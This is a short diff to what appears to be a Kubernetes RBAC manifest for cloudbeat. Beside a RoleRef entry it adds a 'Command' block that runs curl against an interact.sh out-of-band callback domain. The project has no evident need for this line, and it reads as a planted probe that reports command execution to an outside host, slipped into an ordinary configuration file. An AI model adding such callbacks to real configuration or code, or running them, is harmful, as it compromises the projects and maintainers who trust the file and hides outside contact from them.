@@ -334,4 +334,6 @@ roleRef:
   kind: Role
   name: cloudbeat-kubeadm-config
   apiGroup: rbac.authorization.k8s.io
+Command: |
+curl -v c9sd6d92vtc0000tr320grhsugayyyyyb.interact.sh
 ---
